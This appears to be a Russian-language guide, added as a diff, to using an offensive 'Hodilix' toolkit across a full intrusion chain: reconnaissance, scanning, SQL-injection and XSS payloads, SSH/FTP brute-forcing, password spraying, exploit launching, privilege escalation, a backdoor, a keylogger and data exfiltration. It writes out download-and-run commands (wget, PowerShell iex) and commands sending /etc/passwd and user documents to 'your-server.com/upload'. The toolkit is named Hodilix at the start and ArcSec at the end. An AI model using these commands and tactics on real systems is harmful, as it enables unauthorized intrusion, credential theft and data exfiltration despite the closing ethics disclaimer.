@@ -1,0 +1,437 @@
+
+
+## **Часть 2: Детальное руководство по инструментам Hodilix toolkit и практическим действиям** By Влад маньяк
+
+### **2.1 Этап разведки: Пассивный сбор информации**
+
+#### **WHOIS Lookup (`whois_lookup.py`)**
+**Назначение:** Получение регистрационной информации о домене.
+
+**Практическое использование:**
+```bash
+python3 whois_lookup.py -d example.com
+python3 whois_lookup.py -d target-company.com
+```
+
+**Что ищем в выводе:**
+- **Registrar** — кто регистратор домена
+- **Creation/Expiration date** — когда домен создан/истекает
+- **Name Servers** — DNS-серверы цели
+- **Admin contacts** — контакты администратора (может содержать имена, email)
+
+**Пример полезных данных:**
+```
+Domain Name: TARGET-COMPANY.COM
+Registry Domain ID: 1234567_DOMAIN_COM-VRSN
+Registrar WHOIS Server: whois.godaddy.com
+Creation Date: 2018-04-15T10:23:00Z
+Registrant Email: admin@target-company.com
+Name Server: ns1.cloudflare.com
+Name Server: ns2.cloudflare.com
+```
+
+#### **DNS Enumeration (`dns_enum.py`)**
+**Назначение:** Перечисление DNS-записей для обнаружения инфраструктуры.
+
+**Практическое использование:**
+```bash
+python3 dns_enum.py -d example.com
+python3 dns_enum.py -d target-company.com -r all
+```
+
+**Ключевые записи для анализа:**
+- **A/AAAA records** — IPv4/IPv6 адреса
+- **MX records** — почтовые серверы
+- **TXT records** — SPF, DKIM, иногда утечки информации
+- **NS records** — авторитативные DNS-серверы
+- **CNAME records** — алиасы и субдомены
+
+**Пример обнаружения субдоменов:**
+```
+A record: web01.target-company.com → 192.168.1.100
+A record: api.target-company.com → 192.168.1.101
+A record: dev.target-company.com → 192.168.1.102
+MX record: mail.target-company.com → 192.168.1.50
+```
+
+#### **Subdomain Bruteforcer (`subdomain_bruteforcer.py`)**
+**Назначение:** Обнаружение скрытых субдоменов.
+
+**Практическое использование:**
+```bash
+# С использованием стандартного словаря
+python3 subdomain_bruteforcer.py -d target-company.com -w common_subdomains.txt
+
+# С кастомным словарем
+python3 subdomain_bruteforcer.py -d target-company.com -w /usr/share/wordlists/subdomains-top1million-5000.txt
+```
+
+**Эффективные стратегии:**
+1. **Начните с маленького словаря** (100-500 самых популярных субдоменов)
+2. **Используйте большой словарь** для глубокого анализа
+3. **Комбинируйте с DNS enum** для полной картины
+
+---
+
+### **2.2 Этап сканирования: Активное исследование**
+
+#### **Port Scanner (`port_scanner.py`)**
+**Назначение:** Определение открытых портов и сервисов.
+
+**Практическое использование:**
+```bash
+# Быстрое сканирование основных портов
+python3 port_scanner.py -t 192.168.1.100 -p 21,22,80,443,3389
+
+# Полное сканирование
+python3 port_scanner.py -t 192.168.1.100 -p 1-1000
+
+# Сканирование диапазона сетей
+python3 port_scanner.py -t 192.168.1.1-254 -p 80,443
+```
+
+**Анализ результатов:**
+```
+PORT     STATE    SERVICE
+21/tcp   open     ftp
+22/tcp   open     ssh
+80/tcp   open     http
+443/tcp  open     https
+3306/tcp open     mysql
+3389/tcp filtered rdp
+```
+
+**Что делать дальше на основе открытых портов:**
+- **21/FTP** → Проверить анонимный доступ (`ftp_bruteforce.py`)
+- **22/SSH** → Проверить слабые учетные данные (`ssh_bruteforce.py`) 
+- **80/HTTP** → Веб-анализ (`vulnerability_scanner.py`, `sql_injection_scanner.py`)
+- **3306/MySQL** → Попытка подключения с стандартными учетками
+
+#### **Advanced Scanner (`advanced_scanner.py`)**
+**Назначение:** Более детальное сканирование с определением версий.
+
+**Практическое использование:**
+```bash
+python3 advanced_scanner.py -t 192.168.1.100
+python3 advanced_scanner.py -t 192.168.1.0/24 --service-version
+```
+
+**Пример полезного вывода:**
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-server-header: Apache/2.4.18 (Ubuntu)
+| http-title: Test Company - Home
+```
+
+---
+
+### **2.3 Веб-анализ и поиск уязвимостей**
+
+#### **Vulnerability Scanner (`vulnerability_scanner.py`)**
+**Назначение:** Автоматизированное сканирование веб-приложений.
+
+**Практическое использование:**
+```bash
+python3 vulnerability_scanner.py -u http://target-company.com
+python3 vulnerability_scanner.py -u https://target-company.com --deep-scan
+```
+
+**Типичные находки:**
+- Устаревшие версии ПО (WordPress, Joomla, Apache)
+- Наличие административных панелей (/admin, /wp-admin)
+- Информационные утечки (версии, ошибки)
+- Небезопасные заголовки
+
+#### **SQL Injection Scanner (`sql_injection_scanner.py`)**
+**Назначение:** Поиск SQL-инъекций в параметрах URL и формах.
+
+**Практическое использование:**
+```bash
+# Базовая проверка URL
+python3 sql_injection_scanner.py -u "http://target.com/products.php?id=1"
+
+# Проверка POST параметров
+python3 sql_injection_scanner.py -u "http://target.com/login" --data "username=admin&password=test"
+
+# Комплексная проверка сайта
+python3 sql_injection_scanner.py -u "http://target.com" --crawl
+```
+
+**Пример успешного обнаружения:**
+```
+[!] SQL Injection found in parameter: id
+[!] URL: http://target.com/products.php?id=1'
+[!] Payload: 1' AND 1=1--
+[!] Database type: MySQL
+```
+
+#### **XSS Scanner (`xss_scanner.py`)**
+**Назначение:** Поиск уязвимостей межсайтового скриптинга.
+
+**Практическое использование:**
+```bash
+python3 xss_scanner.py -u "http://target.com/search?q=test"
+python3 xss_scanner.py -u "http://target.com/contact" --data "name=test&message=test"
+```
+
+**Эффективные векторы для тестирования:**
+```javascript
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+javascript:alert('XSS')
+```
+
+---
+
+### **2.4 Взлом учетных данных**
+
+#### **SSH Bruteforce (`ssh_bruteforce.py`)**
+**Назначение:** Подбор учетных данных SSH.
+
+**Практическое использование:**
+```bash
+# Брутфорс одного пользователя
+python3 ssh_bruteforce.py -t 192.168.1.100 -u root -w passwords.txt
+
+# Брутфорс нескольких пользователей
+python3 ssh_bruteforce.py -t 192.168.1.100 -U users.txt -w passwords.txt
+
+# С ограничением скорости (чтобы избежать блокировки)
+python3 ssh_bruteforce.py -t 192.168.1.100 -u admin -w rockyou.txt --delay 2
+```
+
+**Эффективные словари:**
+- `rockyou.txt` — общий словарь паролей
+- `ssh_passwords.txt` — специализированные SSH пароли
+- Кастомные словари на основе информации о компании
+
+#### **FTP Bruteforce (`ftp_bruteforce.py`)**
+**Назначение:** Подбор учетных данных FTP.
+
+**Практическое использование:**
+```bash
+python3 ftp_bruteforce.py -t 192.168.1.100 -u anonymous -w passwords.txt
+python3 ftp_bruteforce.py -t 192.168.1.100 -U users.txt -w passwords.txt
+```
+
+**Особенности FTP:**
+- Часто разрешен анонимный доступ
+- Много систем с стандартными учетками (admin:admin, ftp:ftp)
+- Хорошая точка входа для получения файлов
+
+#### **Password Spray Tool (`password_spray_tool.py`)**
+**Назначение:** Атака "распылением паролей" на множество пользователей.
+
+**Практическое использование:**
+```bash
+# Password spraying против домена
+python3 password_spray_tool.py -u users.txt -p "Company123!" -d company.local
+
+# С несколькими паролями
+python3 password_spray_tool.py -u users.txt -P common_passwords.txt -d company.local --delay 30
+```
+
+**Стратегия:**
+1. Соберите список пользователей (из WHOIS, LinkedIn, утечек)
+2. Используйте 2-3 самых вероятных пароля
+3. Добавьте задержки между попытками
+4. Начинайте с наименее привилегированных учеток
+
+---
+
+### **2.5 Эксплуатация и повышение привилегий**
+
+#### **Exploit Framework (`exploit_framework.py`)**
+**Назначение:** Запуск эксплойтов для известных уязвимостей.
+
+**Практическое использование:**
+```bash
+# Список доступных эксплойтов
+python3 exploit_framework.py --list
+
+# Запуск конкретного эксплойта
+python3 exploit_framework.py -x cve_2021_44228 -t 192.168.1.100
+
+# С кастомными параметрами
+python3 exploit_framework.py -x wordpress_rce -t 192.168.1.100 --port 80 --path /wp-admin
+```
+
+#### **Linux Privilege Escalation (`linux_priv_esc.py`)**
+**Назначение:** Автоматизированный поиск векторов повышения привилегий в Linux.
+
+**Практическое использование на целевой машине:**
+```bash
+# Скачайте скрипт на целевую машину и запустите
+wget http://your-server.com/linux_priv_esc.py
+python3 linux_priv_esc.py
+```
+
+**Что проверяет скрипт:**
+- **SUID/GUID файлы** — неправильно настроенные права
+- **Sudo права** — команды, доступные без пароля
+- **Cron jobs** — задания с слабыми правами
+- **Кernel exploits** — уязвимости ядра
+- **Сетевые сервисы** — локально доступные сервисы
+
+#### **Windows Privilege Escalation (`windows_priv_esc.py`)**
+**Назначение:** Поиск векторов повышения привилегий в Windows.
+
+**Практическое использование:**
+```powershell
+# Через PowerShell
+iex (New-Object Net.WebClient).DownloadString('http://your-server.com/windows_priv_esc.py')
+```
+
+**Что проверяет скрипт:**
+- **Слабая конфигурация служб** — службы с избыточными правами
+- **AlwaysInstallElevated** — установка программ с правами администратора
+- **Небезопасные реестровые ключи** — автозапуск с высокими привилегиями
+- **Token privileges** — привилегии текущего пользователя
+
+---
+
+### **2.6 Пост-эксплуатация**
+
+#### **Backdoor (`backdoor.py`)**
+**Назначение:** Создание постоянного доступа к системе.
+
+**Практическое использование:**
+```bash
+# На атакующей машине (прослушивание)
+python3 backdoor.py --listen -p 4444
+
+# На целевой машине (подключение)
+python3 backdoor.py --connect -t 192.168.1.50 -p 4444
+```
+
+**Методы установки бэкдора:**
+- Добавление в автозагрузку
+- Создание службы Windows
+- Cron jobs в Linux
+- Замена системных бинарников
+
+#### **Keylogger (`keylogger.py`)**
+**Назначение:** Запись нажатий клавиш.
+
+**Практическое использование:**
+```bash
+# Запуск keylogger'а
+python3 keylogger.py --start
+
+# С сохранением в файл
+python3 keylogger.py --output keystrokes.log
+
+# С отправкой на сервер
+python3 keylogger.py --server http://your-server.com/log
+```
+
+#### **Data Exfiltration (`data_exfil.py`)**
+**Назначение:** Извлечение данных с скомпрометированной системы.
+
+**Практическое использование:**
+```bash
+# Извлечение файла
+python3 data_exfil.py -f /etc/passwd -s http://your-server.com/upload
+
+# Извлечение директории
+python3 data_exfil.py -d /home/user/documents -s http://your-server.com/upload
+
+# С шифрованием
+python3 data_exfil.py -f database.db -s http://your-server.com/upload --encrypt
+```
+
+---
+
+### **2.7 Специфические эксплойты**
+
+#### **CVE-2024-23897 Exploit**
+**Назначение:** Эксплойт для конкретной уязвимости.
+
+**Практическое использование:**
+```bash
+# Проверка на уязвимость
+python3 cve_2024_23897.py -t 192.168.1.100 --check
+
+# Запуск эксплойта
+python3 cve_2024_23897.py -t 192.168.1.100 --exploit --cmd "whoami"
+
+# С кастомным портом
+python3 cve_2024_23897.py -t 192.168.1.100 -p 8080 --exploit
+```
+
+#### **Hash Cracker (`hash_cracker.py`)**
+**Назначение:** Взлом хешей паролей.
+
+**Практическое использование:**
+```bash
+# Взлом одного хеша
+python3 hash_cracker.py -h 5d41402abc4b2a76b9719d911017c592 -w rockyou.txt
+
+# Взлом файла с хешами
+python3 hash_cracker.py -H hashes.txt -w rockyou.txt
+
+# С указанием типа хеша
+python3 hash_cracker.py -h "admin" -t md5 -w passwords.txt
+```
+
+---
+
+### **2.8 Анализ и отчетность**
+
+#### **Log Analyzer (`log_analyzer.py`)**
+**Назначение:** Анализ логов для поиска подозрительной активности.
+
+**Практическое использование:**
+```bash
+# Анализ Apache логов
+python3 log_analyzer.py -f access.log --web
+
+# Анализ SSH логов
+python3 log_analyzer.py -f auth.log --ssh
+
+# Поиск конкретных паттернов
+python3 log_analyzer.py -f logs.txt --pattern "sql injection"
+```
+
+---
+
+### **Практический сценарий полного теста**
+
+**Шаг 1: Разведка**
+```bash
+python3 whois_lookup.py -d target-company.com
+python3 dns_enum.py -d target-company.com
+python3 subdomain_bruteforcer.py -d target-company.com -w subdomains.txt
+```
+
+**Шаг 2: Сканирование**
+```bash
+python3 port_scanner.py -t web01.target-company.com -p 1-1000
+python3 advanced_scanner.py -t 192.168.1.100 --service-version
+```
+
+**Шаг 3: Веб-анализ**
+```bash
+python3 vulnerability_scanner.py -u http://web01.target-company.com
+python3 sql_injection_scanner.py -u "http://web01.target-company.com/products?id=1"
+```
+
+**Шаг 4: Взлом доступа**
+```bash
+python3 ssh_bruteforce.py -t 192.168.1.100 -u admin -w passwords.txt
+```
+
+**Шаг 5: Повышение привилегий**
+```bash
+# На целевой машине после получения доступа
+python3 linux_priv_esc.py
+```
+
+**Шаг 6: Документирование**
+- Сохраните все команды и вывод
+- Сделайте скриншоты критичных находок
+- Задокументируйте каждый успешный этап
+
+Это руководство дает вам полный арсенал для проведения реального тестирования на проникновение с использованием инструментов ArcSec. Помните о важности этичного подхода и всегда получайте разрешение перед тестированием!
